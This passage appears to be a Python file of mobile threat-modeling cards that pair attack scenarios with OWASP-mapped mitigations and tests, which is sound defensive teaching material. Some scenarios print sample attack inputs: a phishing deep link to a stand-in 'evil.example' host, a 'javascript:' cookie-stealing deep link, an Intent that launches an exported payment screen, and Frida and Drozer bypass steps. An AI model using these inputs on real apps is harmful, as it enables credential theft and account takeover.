Unpatched vulnerabilities in third-party dependencies provide attackers with documented, often publicly exploited attack paths. Exploit code frequently exists before the patched version is deployed.

### What can go wrong?

- Pre-existing CVEs in dependencies are exploited without the attacker needing to develop new attack techniques.
- Supply-chain attacks inject malicious code into a dependency before it is consumed by the app.
- Apps that do not enforce a minimum OS version run on devices that cannot receive OS security patches.
- Outdated SDKs may use deprecated cryptographic algorithms or insecure API defaults.

### What are we going to do about it?

- Integrate Software Composition Analysis (SCA) tooling (Dependabot, OWASP Dependency-Check, Snyk) into CI to flag known CVEs automatically.
- Define and enforce a maximum tolerable lag between a library patch release and production adoption — treat CVE severity ≥ 7 as a blocker.
- Review transitive dependencies, not just direct ones; the vulnerable library may be pulled in indirectly.
- Pin dependency versions in the build file; avoid dynamic version ranges that can silently change.
- Maintain a software bill of materials (SBOM) and update it with every release.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `./gradlew dependencyInsight` to inspect transitive dependency versions.
- OWASP Dependency-Check Gradle plugin: `apply plugin: 'org.owasp.dependencycheck'`.
- Dependabot or Renovate: configure to auto-create PRs for dependency updates with CVSS thresholds.
- `minSdkVersion`: Android 11 (API 30) is the practical minimum for continued security-patch coverage; document exceptions.
- `targetSdkVersion`: must meet Google Play Store requirements and should match the current API level.

**iOS**
- `swift package show-dependencies --format json` to audit Swift Package Manager dependencies.
- CocoaPods: `pod outdated` lists packages with available updates.
- Set a minimum deployment target supported by Apple's current security-patch window (typically current - 2 major versions).
- Review Swift Package Index security advisories.

**CI/CD**
- Add a SCA step that fails the build on CVSS ≥ 7 findings.
- Generate an SBOM in CycloneDX or SPDX format on every release build.
- Sign and verify dependency artifact checksums in the build pipeline.

**OWASP Mappings**
- MASVS: CODE-1, CODE-2, CODE-3, NETWORK-1
- MASTG: TEST-0036, TEST-0042, TEST-0080, TEST-0085, TEST-0245, TEST-0272, TEST-0273, TEST-0274, TEST-0275, TEST-0382, TEST-0383, TEST-0384, TEST-0392
- MASWE: MASWE-0049, MASWE-0075, MASWE-0076, MASWE-0077, MASWE-0078
"""
}

CARDS["platform-&-code/PCQ"] = {
"explanation": """\
## Scenario: Xavier can inject scripts into the web view because it allows embedding content using deep linking without proper authorization and validation of the host, schema, and path of the target, or because safe browsing is disabled

Consider a scenario where Xavier discovers the target app's deep-link handler parses a `url` parameter and passes it directly to `WebView.loadUrl()` without any hostname validation. Xavier sends the victim a push notification with the deep link `targetapp://view?url=https://accounts.target-app.com.evil.example/login`. The app opens the URL in a branded WebView, without an address bar, on a page that mimics the real login screen. The user enters their credentials. Xavier's server receives them.

Additionally, the WebView has `addJavascriptInterface` exposing native methods, and `setAllowUniversalAccessFromFileURLs(true)` enabled — so attacker-controlled JavaScript can call native APIs and read local files.

### Example

Xavier sends a crafted deep link through a social media message. The link is `appscheme://open?url=javascript:alert(document.cookie)`. The WebView loads the `javascript:` URL, executes the script, and displays the session cookie in an alert — proving that script injection is possible. The same technique, with a `fetch()` call instead of `alert()`, silently exfiltrates the token to Xavier's server. Safe browsing was disabled after it flagged a test domain during development.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** (script injection), **Spoofing** (phishing via trusted app chrome), and **Elevation of Privilege** (native API access from injected script).

### What can go wrong?

- Injected JavaScript runs in the WebView's origin context, accessing cookies, `localStorage`, and any exposed native bridge methods.
- Without an address bar, users cannot verify the URL, enabling highly convincing phishing.
- `addJavascriptInterface` bridges allow attacker scripts to invoke sensitive device APIs.
- `setAllowFileAccessFromFileURLs` and `setAllowUniversalAccessFromFileURLs` enable cross-origin file reads.

### What are we going to do about it?

- Validate the full URL (scheme, host, path) against an allowlist before passing it to any WebView loading method.
- Enable Safe Browsing: `WebView.setSafeBrowsingEnabled(true)`.
- Remove `addJavascriptInterface` from release builds, or restrict it to a minimal, hardened API surface with input validation.
- Disable unnecessary WebView settings: `setAllowFileAccessFromFileURLs(false)`, `setAllowUniversalAccessFromFileURLs(false)`.
- On iOS, implement `WKNavigationDelegate` to allow only allowlisted origins.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android WebView**
- `WebSettings.setSafeBrowsingEnabled(true)` — verify it has not been disabled.
- `WebSettings.setAllowFileAccess(false)`, `setAllowContentAccess(false)`, `setAllowFileAccessFromFileURLs(false)`, `setAllowUniversalAccessFromFileURLs(false)`.
- Audit every `addJavascriptInterface` call; remove in production or restrict to the minimum needed methods with input validation.
- Deep-link URL validation before `webView.loadUrl()`: parse the `Uri`, verify `scheme` and `host` against an allowlist; reject `javascript:`, `file:`, and `data:` schemes unconditionally.

**iOS WKWebView**
- Implement `decidePolicyFor navigationAction` in `WKNavigationDelegate`: allow only `https://` with allowlisted hostnames.
- Validate Universal Link paths against the `apple-app-site-association` configuration.
- `WKScriptMessageHandler` (equivalent of JS interface): validate all messages; expose only the minimum required methods.
- Use `WKContentWorld` (iOS 14+) to isolate injected scripts from page JavaScript.

**Testing**
- Enumerate all deep-link schemes in `AndroidManifest.xml` and `CFBundleURLTypes`.
- Send crafted deep links with `javascript:`, `file://`, and attacker-controlled `https://` URLs; verify all are rejected.
- Use Frida to hook `WebView.loadUrl()` and log all URLs loaded during a session.

**OWASP Mappings**
- MASVS: AUTH-1, CODE-4, PLATFORM-1, PLATFORM-2, STORAGE-2
- MASTG: TEST-0027, TEST-0028, TEST-0031, TEST-0032, TEST-0033, TEST-0070, TEST-0075, TEST-0076, TEST-0077, TEST-0078, TEST-0250, TEST-0251, TEST-0252, TEST-0253, TEST-0331, TEST-0332, TEST-0333, TEST-0334, TEST-0335, TEST-0336, TEST-0370, TEST-0371, TEST-0376, TEST-0377, TEST-0378, TEST-0379, TEST-0380, TEST-0393, TEST-0394, TEST-0395, TEST-0398, TEST-0399, TEST-0400
- MASWE: MASWE-0040, MASWE-0058, MASWE-0069, MASWE-0070, MASWE-0071, MASWE-0072, MASWE-0073
"""
}

CARDS["platform-&-code/PCK"] = {
"explanation": """\
## Scenario: Grant can modify or expose data by influencing or altering JavaScript bridges, extensions, or interprocess communication such as shared memory, message passing, pipes, or sockets

Consider a scenario where Grant has identified the target app exposes a `@JavascriptInterface`-annotated class with methods including `getSessionToken()` and `writePreference(key, value)`. He delivers a crafted HTML page to the app's WebView via an unvalidated deep link. The page calls `window.NativeBridge.getSessionToken()` and `window.NativeBridge.writePreference("admin", "true")`. Grant now has the session token and has promoted himself to admin. The JavaScript bridge was originally added for legacy web compatibility and never removed.

1. JavaScript bridges give arbitrary web-page JavaScript direct access to native device APIs.
2. `postMessage`-based communication without origin validation relays attacker-controlled content into native handlers.
3. Shared memory, pipes, or sockets between app processes without integrity checks allow one process to feed malicious data to another.

### Example

Grant discovers the app's inter-process notification service accepts URLs via a Binder interface and loads them in an internal WebView. He sends a `javascript:` URL through the Binder interface. The WebView executes the script. Grant now has access to every native method on the bridge. The service was designed for displaying HTML notifications. It was not designed for untrusted callers. The distinction was never implemented.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Elevation of Privilege**.

A JavaScript bridge grants untrusted JavaScript — arriving via an attacker-controlled URL or injected script — direct access to native capabilities, effectively bypassing the sandboxing that separates web and native execution contexts.

### What can go wrong?

- Native methods (file access, credential retrieval, preference modification) are exposed to any JavaScript running in the WebView.
- Shared-memory IPC without integrity verification allows one process to feed malicious data to another.
- `postMessage` handlers without origin checks accept messages from attacker-controlled iframes or pages.

### What are we going to do about it?

- Remove `addJavascriptInterface` from production builds unless absolutely required; if kept, expose only a minimal interface and validate every input.
- Restrict JavaScript execution to allowlisted origins within the WebView.
- Validate the `origin` of every `postMessage` before processing the message.
- For inter-process pipes or shared memory: authenticate peers and verify message integrity with a MAC.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Grep source for `addJavascriptInterface`: audit every annotated class and method for access to sensitive resources.
- Restrict bridge availability: check that the loaded URL is on an allowlist before injecting the interface.
- Remove via `webView.removeJavascriptInterface("name")` before loading any content from external sources.
- `WebMessagePort` / `postMessage`: validate the origin before processing the message payload.

**iOS**
- `WKScriptMessageHandler.userContentController(_:didReceive:)` receives messages from all JavaScript in the WebView.
- Validate `message.frameInfo.request.url` against an allowlist before acting on `message.body`.
- Use `WKContentWorld` (iOS 14+) to isolate page scripts from injected bridge scripts.
- Avoid exposing Swift objects to page JavaScript; pass only the minimum required data via `evaluateJavaScript`.

**Testing**
- List all `addJavascriptInterface` calls and their exposed method signatures using static analysis (jadx, semgrep).
- Call all bridge methods from a test WebView with boundary-case and injection inputs.
- Monitor `logcat` during a session with a controlled malicious page for unexpected bridge invocations.

**OWASP Mappings**
- MASVS: PLATFORM-1, PLATFORM-2, STORAGE-2
- MASTG: TEST-0007, TEST-0030, TEST-0033, TEST-0056, TEST-0072, TEST-0078
- MASWE: MASWE-0068
"""
}

CARDS["platform-&-code/PCA"] = {
"explanation": """\
## Ace: You have invented a new attack against "Platform & Code"

This card invites your team to step off the scripted threat list and think creatively about the platform surface your app exposes.

### What does this card ask you to do?

Invent a realistic new threat in the Platform & Code domain that is not already represented by PC2 through PCK. Think about:

- **Emerging APIs:** What OS feature introduced in the last year does the app use without fully understanding its security implications? (App Clips, Live Activities, Interactive Widgets, CarPlay extensions, visionOS scenes)
- **Side channels:** Can an attacker infer sensitive app state from CPU utilisation, network traffic timing, screen brightness changes, or sensor readings?
- **Build and supply chain:** Could a CI plugin, code-generation template, or obfuscation tool introduce a backdoor or insecure default into the compiled binary?
- **New IPC surfaces:** Does the app share state with a wearable companion, a TV app, or a browser extension? Do those channels apply the same access controls as the main app?

### How to play this card

1. **Nominate a threat:** One player (or the group) proposes a specific, plausible scenario not covered by other PC cards.
2. **Name the attacker and victim:** Who has what capabilities? What do they want?
3. **Classify the threat (STRIDE):** Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, or Elevation of Privilege?
4. **Assess likelihood and impact:** Is this realistic for your app's threat model?
5. **Propose a mitigation:** What design, code, or configuration change reduces the risk?
6. **Score the card:** A well-formed novel threat earns full points.

### Example starting prompts

- "Our analytics SDK bundles its own WebView. What if that WebView has a vulnerability our app's controls don't cover?"
- "Our new home-screen widget shares a database DAO with the main app. What if the widget's data endpoint doesn't apply the same access controls?"
- "What if a malicious accessibility service reads every field in our app without triggering any permission prompt visible to the user?"

## Threat Modeling

### STRIDE

Varies by the invented attack. Document the classification as part of play.

### What can go wrong?

Platform APIs evolve faster than security guidance. An attack class that does not exist today may appear next year as researchers publish new techniques. Threat modeling must be a living exercise, revisited with each major platform release.

### What are we going to do about it?

- Validate the invented threat against the current OWASP MASTG and MASVS to check whether existing guidance already covers it.
- If genuinely novel, consider contributing it to the OWASP MASVS/MASTG project as a new weakness candidate.
- Document the threat and the agreed mitigation in the team's threat model register.
""",
"technical_note": """\
## Guidance for Novel Platform & Code Threats

**Framing the attack surface**
- Which OS API, SDK, or platform feature does the threat exploit?
- Is the feature documented with security guidance in the platform developer reference?
- Does the MASTG "Mobile App Attack Surface" section cover it?

**Describing the exploit chain**
- What attacker capability is required (same-device app, network access, physical access)?
- What is the full exploitation chain: how does the attacker reach the vulnerable code and what is the impact?

**Validating the threat**
- Can you write a proof-of-concept, even a prototype, to confirm the threat is realistic?
- Are there CVEs, academic papers, or conference talks addressing related techniques?

**Mapping to standards**
- MASVS category: PLATFORM, CODE, STORAGE, AUTH, NETWORK, CRYPTO, PRIVACY, or RESILIENCE?
- MASTG test: does an existing test apply, or would a new one be needed?
- MASWE: is there an existing weakness entry, or should one be proposed?

**OWASP Mappings**
- MASVS: determined by the invented threat
- MASTG: determined by the invented threat
- MASWE: determined by the invented threat

Do not fabricate references. If no specific MASTG test or MASWE entry exists for the invented threat, note this explicitly and consider contributing one to the project.
"""
}


# ─────────────────────────────────────────────────────────
# AUTHENTICATION & AUTHORIZATION (AA) — preserve existing prose where substantial
# ─────────────────────────────────────────────────────────

CARDS["authentication-&-authorization/AA2"] = {
"explanation": """\
## Scenario: Jie can use the app to perform sensitive operations because the "unlocked key" is not used during the application flow

Consider a scenario where Jie and Choi live together. Like all households, they keep some secrets — what they spend money on, which streaming services they are paying for, and whether they still owe each other for a certain concert ticket. It is not our job to referee their financial disagreements, but it is our job to ensure the app protects the data it stores.

There are several ways Jie might access Choi's sensitive data:

1. If Choi's phone is left unattended and unlocked, Jie can open the banking app and access sensitive data if the app does not require the unlocked key before displaying account information.
2. If Jie knows Choi's device PIN (from shoulder-surfing), and the app's cryptographic keys are not bound to biometric or user-authentication events, Jie can access decrypted data without triggering a re-authentication prompt.
3. If Choi leaves the app open in the background, Jie can resume it and perform sensitive operations (such as transferring funds) without re-authenticating, because the app does not require the unlocked key before confirming high-value actions.

### Example

Choi really needed to check his bank balance but also really needed to visit the bathroom. He left his phone unlocked on the table. Jie, deeply committed to investigating whether Choi actually went to a Bob Dylan concert instead of paying back a debt, opened the banking app. The app had no active session lock and performed no key-based authentication check on launch. Jie found not only the concert evidence but also the bank account details. Choi's next financial disclosure was involuntary.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing**.

Jie is masquerading as Choi. By exploiting the absence of unlocked-key enforcement, the app fails to verify the true identity of the person interacting with it, allowing Jie to act with Choi's full privileges.

### What can go wrong?

If the unlocked key is not required for sensitive operations, the app may be vulnerable to local authentication bypass. This is exploitable by a partner with physical device access, a thief, or an attacker who can extract the keystore/keychain without triggering authentication. The result is a local data breach: private financial, medical, or personal information is exposed.

### What are we going to do about it?

- Configure cryptographic keys with `setUserAuthenticationRequired(true)` (Android) or `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` with `biometryAny` or `biometryCurrentSet` access control (iOS) so they cannot be used without a fresh authentication event.
- Use a time-limited authentication validity window (`setUserAuthenticationValidityDurationSeconds`) only for truly low-risk operations; set it to zero for decryption of sensitive data.
- Enforce re-authentication when the app transitions from background to foreground during a sensitive session.
- Require step-up authentication (re-authentication against a remote endpoint or a fresh biometric prompt) before confirming high-value operations such as fund transfers, email or password changes.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Create cryptographic keys with `KeyGenParameterSpec.Builder`:
  - `setUserAuthenticationRequired(true)` — key is not usable without a user-authentication event.
  - `setUserAuthenticationValidityDurationSeconds(-1)` — requires biometric prompt per-use (most secure for sensitive operations); a positive value allows a time window.
  - `setInvalidatedByBiometricEnrollment(true)` — key is invalidated if new biometrics are enrolled.
- Use `BiometricPrompt` with `CryptoObject` wrapping a `Cipher` to ensure the authentication is cryptographically bound to the key operation.
- Check that the app calls `cipher.init(DECRYPT_MODE, key)` after `BiometricPrompt.authenticate()` resolves, not before.

**iOS**
- Use `SecAccessControl` with `kSecAccessControlBiometryCurrentSet` or `kSecAccessControlUserPresence` when storing keys in the Secure Enclave.
- `LAContext.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, ...)` without a `SecAccessControl`-bound key is bypassable on jailbroken devices — always bind the key.
- For step-up auth, call `LAContext.invalidate()` to clear the cached authentication context before a sensitive operation.

**Testing**
- Use objection / Frida to hook `BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded` and return `true` without actual authentication; verify the app rejects the operation.
- Lock the screen mid-session, resume the app, and confirm that sensitive data is not accessible before re-authentication.

**OWASP Mappings**
- MASVS: AUTH-2, AUTH-3, CRYPTO-2
- MASTG: TEST-0017, TEST-0018, TEST-0064, TEST-0270, TEST-0271, TEST-0328
- MASWE: MASWE-0018, MASWE-0031, MASWE-0043, MASWE-0046
"""
}

CARDS["authentication-&-authorization/AA3"] = {
"explanation": """\
## Scenario: Choi can access capabilities, objects, resources, or properties they should not be authorized to access because entitlements or permissions are too wide, not properly set, or not enforced

Consider a scenario where Choi installs a malicious app that a social-engineering contact shared with him. The malicious app probes other apps on the device for exported components with overly broad permissions. It finds the target app's payment activity is exported with no permission restriction and no caller validation. Choi's malicious app launches the payment activity directly, bypassing the normal authentication flow.

### Example

Choi's malicious app calls `startActivity(Intent().setComponent(ComponentName("com.target.app", "com.target.app.PaymentActivity")))`. The PaymentActivity launches without requiring authentication because it assumes only the main app's navigation flow would ever open it. Choi is now looking at a pre-populated payment form, authenticated as the device owner's account. The "by design" assumption that only the app's own navigation would open this screen turned out to be a design flaw.

## Threat Modeling

### STRIDE

This scenario falls under **Elevation of Privilege**.

Choi's malicious app exploits overly broad entitlements or missing authorization checks to access capabilities it should not be allowed to access, escalating its effective privileges by leveraging the victim app's components.

### What can go wrong?

- A malicious app triggers exported activities, services, or content providers to perform privileged operations on behalf of the device owner.
- Custom permissions with `normal` or `dangerous` protection levels can be acquired by any app, defeating the purpose of the permission check.
- Orphaned custom permissions — used by the app but not defined by it — can be declared first by a malicious app, which then acquires the permission and gains access to protected components.
- A race condition during app installation allows a malicious app to claim a signature-level custom permission before the defining app is installed.

### What are we going to do about it?

- Mark all components not intended for external access as `android:exported="false"`.
- Protect exported components with `android:permission` using `signature` or `signatureOrSystem` protection level.
- Ensure custom permissions are defined in the same app that uses them, using `<permission>` declarations in the manifest.
- Avoid `normal` and `dangerous` protection levels for permissions that gate sensitive functionality.
- Verify the caller's identity inside sensitive components: check `callingPackage`, validate signatures, or use a challenge-response.
- On iOS, restrict entitlements to the minimum required in the `.entitlements` file; prefer App Groups over broad keychain sharing groups.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Audit all `<activity>`, `<service>`, `<receiver>`, `<provider>` elements: `android:exported="true"` without `android:permission` is a finding.
- For custom permissions: verify the `<permission>` declaration is in the same manifest as the `android:permission` reference; use `protectionLevel="signature"`.
- Verify no orphaned permissions: all `android:permission` values must reference a `<permission>` that will be installed alongside the protected app.
- CVE-2019-2200 (Android < 10): race condition in custom permission claiming — ensure `minSdkVersion` is 29+, or document the risk.
- `Binder.getCallingUid()` inside components: validate the calling package using `PackageManager.getNameForUid()`.

**iOS**
- Review the `.entitlements` file for overly broad keychain access groups, App Group identifiers, and associated domains.
- Use `com.apple.developer.associated-domains` only for domains you control.
- Avoid broad `com.apple.security.application-groups` sharing unless multiple apps in the group are all trusted.
- Entitlement values are verified by the App Store and on-device at install time; incorrect values cause launch failures.

**Testing**
- Use Drozer: `run app.activity.start --component com.target.app com.target.app.SensitiveActivity`
- Check whether the activity/service/provider launches without triggering an authentication prompt.
- Review the merged manifest for all exported components.

**OWASP Mappings**
- MASVS: AUTH-1, AUTH-3
- MASTG: TEST-0024, TEST-0032, TEST-0069, TEST-0077
- MASWE: (see MASVS references above)
"""
}

CARDS["authentication-&-authorization/AA4"] = {
"explanation": """\
## Scenario: Vandana can bypass biometric authentication because the authentication is misconfigured or not implemented correctly

Consider a scenario where Vandana is a security researcher testing a mobile banking app. She notices the biometric authentication uses `BiometricPrompt` but does not bind the authentication result to a cryptographic operation via a `CryptoObject`. Instead, the app simply reads a boolean `authSucceeded` flag from the callback and proceeds. Vandana hooks the callback with a dynamic instrumentation tool, forces the boolean to `true`, and authenticates as the account owner without presenting a finger or face.

1. Biometric authentication that does not use a hardware-bound cryptographic operation can be bypassed by patching the result.
2. Fallback authentication (PIN, pattern) weaker than the app's security requirement may allow biometric bypass via the fallback path.
3. Incorrect biometric implementation may enrol the attacker's biometrics instead of requiring the user's existing biometrics.

### Example

Vandana attaches Frida to the running app process. She hooks `BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded()` and injects a call with a fabricated `AuthenticationResult`. The app checks a boolean flag that the callback sets, finds it `true`, and opens the account. Vandana never presented a finger. The real account holder's biometrics were irrelevant, because they were never cryptographically verified — only confirmed by a flag in memory that anyone with instrumentation access could flip.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing**.

Vandana impersonates the legitimate user by manipulating the authentication outcome in memory or through a logic bypass, without defeating the biometric hardware itself.

### What can go wrong?

- Boolean-flag-based biometric gating is trivially bypassable with instrumentation tools on rooted/jailbroken devices.
- Fallback PIN authentication, if weaker, becomes the effective security boundary.
- Biometric changes (new fingerprint enrolled) are not detected, allowing a new person with device access to authenticate.

### What are we going to do about it?

- Always bind biometric authentication to a cryptographic operation: use `BiometricPrompt.CryptoObject` on Android, wrapping a `Cipher` initialised with a hardware-backed key configured with `setUserAuthenticationRequired(true)`.
- On iOS, use keys stored in the Secure Enclave with `kSecAccessControlBiometryCurrentSet` so that authentication is verified by hardware, not software.
- Set `setInvalidatedByBiometricEnrollment(true)` so that enrolling a new biometric invalidates the key, requiring re-enrolment.
- Do not rely solely on the boolean result of `onAuthenticationSucceeded`; rely on the ability to use the cryptographic key to decrypt or sign a challenge.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `BiometricPrompt.authenticate(promptInfo, cryptoObject)` — the `CryptoObject` must wrap a `Cipher`, `Mac`, or `Signature` backed by a `KeyStore` key with `setUserAuthenticationRequired(true)`.
- Verify that the app attempts the cryptographic operation (decrypt/sign) after `onAuthenticationSucceeded`, and only proceeds if the operation succeeds.
- `setInvalidatedByBiometricEnrollment(true)` — key is invalidated when a new biometric is enrolled; the app must handle `KeyPermanentlyInvalidatedException` gracefully.
- Do not fall back to a weaker authentication method silently; display a clear message and re-prompt or require remote authentication.

**iOS**
- `SecAccessControl` with `kSecAccessControlBiometryCurrentSet` ties the key to currently enrolled biometrics; enrolling a new face/finger invalidates the key.
- `LAContext.setCredential(_:type:)` is not needed when using Secure Enclave-backed keys — the Enclave handles the verification.
- Do not use `LAContext.evaluatePolicy` alone for high-security operations; always require a successful cryptographic operation with a Secure Enclave key.

**Testing**
- Use Frida to hook `BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded` and call it without actual authentication; verify the app does not proceed.
- On a jailbroken iOS device, use objection to bypass biometric checks; verify the cryptographic operation still fails.
- Enrol a new biometric after key creation; verify the app detects invalidation and requires re-enrolment.

**OWASP Mappings**
- MASVS: AUTH-2, CRYPTO-2
- MASTG: TEST-0017, TEST-0018, TEST-0064, TEST-0266, TEST-0267, TEST-0268, TEST-0269, TEST-0270, TEST-0271, TEST-0326, TEST-0327, TEST-0328, TEST-0329, TEST-0330
- MASWE: MASWE-0044, MASWE-0045, MASWE-0046
"""
}

CARDS["authentication-&-authorization/AA5"] = {
"explanation": """\
## Scenario: Eiman can bypass local authentication through patching and/or by instrumentation because the authentication can be patched out or overloaded

Consider a scenario where Eiman has obtained a jailbroken iOS device. She installs a Frida gadget in the target banking app, hooks the local authentication method, and replaces its return value with a success result. The app's authentication check is a simple function call `-> Bool`. The instrumented call returns `true`. The bank account is open. The biometric hardware was never consulted.

1. Local authentication implemented as a software flag or conditional branch is bypassable by patching the binary or injecting at runtime.
2. Hooking frameworks (Frida, Xposed, Substrate) allow method return values to be overridden at runtime on rooted/jailbroken devices.
3. A modified APK/IPA with the authentication check removed can be re-distributed and installed by an attacker who has physical access to the device or can perform MITM on the update channel.

### Example

Eiman downloads the target app's IPA, re-signs it with her own certificate, removes the biometric check with a binary patcher, and installs it on her jailbroken device. She then restores the app's user data from a backup. The app opens without any authentication. Every stored credential and session token is accessible. Eiman submits the finding as a bug report. The developer's initial response is "that requires a jailbroken device," which is technically true and strategically insufficient for a banking app.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** and **Elevation of Privilege**.

Eiman bypasses identity verification, allowing her to act as the legitimate user. By patching the authentication logic, she elevates her effective privilege to that of an authenticated user without presenting valid credentials.

### What can go wrong?

- Authentication logic implemented purely in software is bypassable with widely available instrumentation tools.
- A patched app distributed to other users can bypass authentication for all of them.
- Credentials, tokens, and private data stored by the app are accessible once local authentication is bypassed.

### What are we going to do about it?

- Bind authentication to cryptographic operations backed by hardware-isolated key storage (Secure Enclave / StrongBox), so that bypassing the software check does not grant access to the cryptographic material needed to decrypt data.
- Implement runtime integrity checks that detect hooking frameworks (Frida, Xposed) and respond by terminating the session or refusing to load sensitive keys.
- Enforce re-authentication against a remote endpoint for high-value operations rather than relying solely on local checks.
- Apply obfuscation to authentication-related code paths as a defence-in-depth measure, increasing the cost of static patching.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Use `BiometricPrompt.CryptoObject` bound to a hardware-backed key (`setIsStrongBoxBacked(true)` where available); bypassing the software check does not give access to the key.
- Detect Frida/Xposed presence: check for `/data/local/tmp/frida-server`, suspicious loaded libraries (`frida`, `xposed`), or anomalous `/proc/self/maps` entries.
- `SafetyNet / Play Integrity API` attest device integrity; fail gracefully (not crash) if attestation fails on non-sensitive operations to avoid DoS.

**iOS**
- Store authentication keys in the Secure Enclave with `kSecAttrTokenIDSecureEnclave` — hardware prevents key extraction regardless of software bypass.
- Detect Substrate / Frida: check for `_logos_meta_method`, `fishhook`, or suspicious `dylib` paths in `_dyld_get_image_name` loops.
- Detect jailbreak indicators: presence of `/usr/bin/cycript`, writable `/private`, Cydia, etc. — treat as a risk signal and escalate to remote re-auth.

**Testing**
- Use objection: `ios authentication bypass` to attempt a bypass; verify the app detects it and refuses to decrypt sensitive data.
- Use jadx/apktool to remove the authentication check from the APK; install and verify the app's cryptographic operations fail without the hardware-backed key.

**OWASP Mappings**
- MASVS: AUTH-2
- MASTG: TEST-0017, TEST-0018, TEST-0064, TEST-0266, TEST-0267, TEST-0327, TEST-0329, TEST-0330
- MASWE: MASWE-0044
"""
}

CARDS["authentication-&-authorization/AA6"] = {
"explanation": """\
## Scenario: Anant can perform sensitive operations without step-up or repeated authentication because authentication requirements do not respond to transaction risk or contextual changes

Consider a scenario where Anant has physical access to a device that was unlocked by the owner 10 minutes ago. The owner stepped away. The banking app's session is still active. Anant initiates a fund transfer to an external account. The app does not require re-authentication for transfers, because the session is valid. Anant transfers a significant amount. The session was "trusted" because the user authenticated at app launch — a contextual state that had since changed materially.

1. A session established at app launch may remain fully trusted even when the device is unattended.
2. High-risk operations (large transfers, account changes, data exports) do not require proportional authentication challenges.
3. Context changes — app moving from background to foreground, network change, location change — do not trigger re-evaluation of trust.

### Example

Anant borrows a colleague's phone for "a moment." The colleague's banking app is in the background. Anant brings it to the foreground and initiates a transfer. The app's last authentication was 8 minutes ago. The session timeout is 15 minutes. No biometric prompt appears for the transfer. The transfer completes. The colleague discovers the loss at end-of-day. The app's UX team had deliberately removed step-up authentication to "reduce friction." Friction sometimes serves a purpose.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** and **Elevation of Privilege**.

Without step-up authentication, Anant can act with the full privileges of the authenticated user for any operation, regardless of the risk level of that operation.

### What can go wrong?

- High-value transactions are completed by an attacker who has brief physical access to an unlocked device.
- A stolen session token allows unlimited operations without any additional authentication challenge.
- Contextual trust signals (device lock, network change, inactivity timeout) are ignored, leaving sessions perpetually trusted.

### What are we going to do about it?

- Implement risk-adaptive authentication: require step-up (biometric prompt or remote challenge) for operations above a defined risk threshold (large amount, new payee, account change).
- Enforce an inactivity timeout: re-authenticate after a period of inactivity, especially for sensitive screens.
- Re-authenticate when the app transitions from background to foreground after a significant interval.
- Bind the step-up authentication to the specific operation via a server-issued challenge, so that a replayed authentication cannot be used for a different transaction.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Use a `KeyStore` key with `setUserAuthenticationValidityDurationSeconds(-1)` for sensitive operations: this requires a fresh biometric prompt each time the key is used.
- Implement an application-level inactivity timer; on expiry, clear the in-memory session state and navigate to the authentication screen.
- For server-side operations, generate a server challenge, sign it with a user-authenticated key, and verify the signature server-side for each high-risk operation.

**iOS**
- `LAContext.invalidate()` before a high-risk operation: forces a new biometric evaluation even if a previous context is still valid.
- Use `kSecAccessControlBiometryCurrentSet` for keys that protect high-risk operations.
- Implement application-level session timeouts using `UIApplicationDelegate.applicationDidEnterBackground` to reset trust state after background transitions exceeding a threshold.

**Testing**
- Authenticate, wait for the inactivity timeout, then attempt a high-risk operation without re-authenticating; verify the app prompts for re-authentication.
- Authenticate, move the app to background for 5 minutes, bring it to foreground, and attempt a transfer; verify a re-auth prompt appears.
- Test with Frida: bypass the step-up prompt callback and verify the server-side challenge fails.

**OWASP Mappings**
- MASVS: AUTH-2, AUTH-3, PLATFORM-3
- MASTG: TEST-0018, TEST-0064, TEST-0268, TEST-0269, TEST-0326
- MASWE: MASWE-0028, MASWE-0029, MASWE-0045
"""
}

CARDS["authentication-&-authorization/AA7"] = {
"explanation": """\
## Scenario: Abdullah can bypass authentication by altering the usual process sequence or flow, by undertaking the process in incorrect order, by manipulating date and time values used by the app, or by using valid features for unintended purposes

Consider a scenario where Abdullah is probing a multi-step account-recovery flow. The flow is: step 1 — enter username; step 2 — answer security questions; step 3 — set new password; step 4 — confirmation. Abdullah skips step 2 by directly posting to step 3's endpoint. The server does not verify that step 2 was completed. Abdullah sets a new password for the account. He did not need to know the answers to the security questions; he needed to know the step order was not enforced.

1. Multi-step flows that do not server-side validate completion of prior steps are vulnerable to step-skipping.
2. Date and time manipulation (setting the device clock to the past) can bypass time-based token expiry or subscription checks.
3. Valid features used for unintended purposes: a "remember me" token meant for a 30-day login being reused indefinitely because no server-side expiry is enforced.

### Example

Abdullah finds the app stores a `step_completed` flag in `SharedPreferences` to track which authentication step is current. He modifies the flag to indicate step 2 is already done and navigates directly to step 3. The client-side state is trusted by the server. The server does not maintain its own session-state machine. Abdullah resets the account password without completing the identity verification step. The "multi-factor" account recovery turned out to be single-factor for attackers who could edit local storage.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** and **Elevation of Privilege**.

By bypassing or reordering authentication steps, Abdullah gains privileges he has not legitimately earned, impersonating a properly authenticated user.

### What can go wrong?

- Account takeover via password reset without identity verification.
- Session tokens granted before all required authentication factors are satisfied.
- Time-based token expiry bypassed by device clock manipulation.
- Business logic enforced client-side only can be skipped by an attacker who modifies local state.

### What are we going to do about it?

- Maintain all multi-step flow state server-side; the server must track which steps have been completed and reject requests for a later step if earlier steps are not verified.
- Never trust client-side state (SharedPreferences, local flags, URL parameters) as proof that a step was completed.
- Use server-generated, signed step-completion tokens; each step returns a signed assertion that the next step can verify server-side.
